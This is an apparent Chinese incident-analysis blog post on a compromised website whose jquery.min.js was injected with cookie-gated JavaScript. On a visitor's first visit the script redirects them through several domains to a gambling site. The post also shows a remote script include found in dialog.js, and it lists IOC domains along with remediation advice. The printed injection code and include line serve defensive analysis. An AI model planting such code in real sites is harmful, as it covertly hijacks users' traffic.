---
title: 页面篡改分析-首次会话跳转菠菜页面篡改分析
date: 2019-03-13T23:48:00+08:00
tags: 红蓝对抗,页面篡改
---
## 首次会话跳转菠菜页面篡改分析
### 前言
在某会曾经出现过一次基于运营商的某度广告推广导致手机平台恶意跳转现象，本次样本发现了一处类似的现象，对其分析发现通过脚本实现的首次跳转功能。下面是详细过程。
![](http://blogimage.xtpeeps.cn/20190920102627.png-A)

<!--more-->

可以看到，整个跳转流程。现在需要做的就是分析其中原理。
发生跳转第一步，在我访问弱点网站的时候自动跳转到了

### 倒序回溯
```
https://www.01321zq[.]com 菠菜 Referer:https://tz01321[.]com/zh-cn/
https://tz01321[.]com 301 location https://tz01321[.]com/zh-cn/
https://tz01321[.]com Referer	https://sdfhu1[.]com/248486.html
https://sdfhu1[.]com/248486.html Referer	弱点网站
```
### 定位篡改点
现在就是确定具体被篡改的位置了：
![](http://blogimage.xtpeeps.cn/1568965401188_566544C4-D462-46c8-A898-6DFD095D3548.png-A)
可以看到这个/statics/js/jquery.min.js文件内被插入下面这段代码，并且根据逻辑可以知道，在用户第一次访问的时候触发此脚本，客户跳转至https[:]//sdfhu1[.]com/248486.html ，同时添加设置cookie,打标非第一次访问，这样下次访问就不会触发此跳转。
```js
var c = documen[t.c]ookie;
     if (c.indexOf('isfirstvisited=false') != -1) {
        
     }
     else {
         var d = new Date();
         d.setFullYear(d.getFullYear() + 1);
         documen[t.c]ookie = 'isfirstvisited=false;expires=' + d.toGMTString();
         location = 'https[:]//sdfhu1[.]com/248486.html'
     }
```
下面为该脚本在源代码的位置：
![](http://blogimage.xtpeeps.cn/20190920162947.png-A)
除了上面的脚本，我们在/statics/js/dialog.js中发现了这样一段，开始怀疑但最后证明仍然为篡改菠菜网站相关：
![](http://blogimage.xtpeeps.cn/20190920163921.png-A)
其中引入了这样一段，而直接访问该脚本不显示任何内容，因此暂时未知其功能：
```js
include("http[:]//www[.]oydaiyun[.]com/images/js.js");
```
```
oydaiyun[.]com  referer http[:]//www[.]oydaiyun[.]com/images/js.js 
```
![](http://blogimage.xtpeeps.cn/20190920173817.png-A)

### 分析过程
```mermaid
graph LR
A[弱点网站,jquery.min.js判断首次访问]-->|yes|B[sdfhu1.com/248486.html]
A-->|no|C[cookie打标非首次访问]
B-->D[tz01321[.]com]
D-->E[01321zq.com菠菜]
```


至此，已经明确了跳转的全过程，修复建议针对被插入页面，及无用js进行清理，同时应对服务器进行全盘后门清理以及漏洞检测，并且应尽量覆盖等保项目日常安检。

### IOCs:
oydaiyun[.]com
sdfhu1[.]com
tz01321[.]com
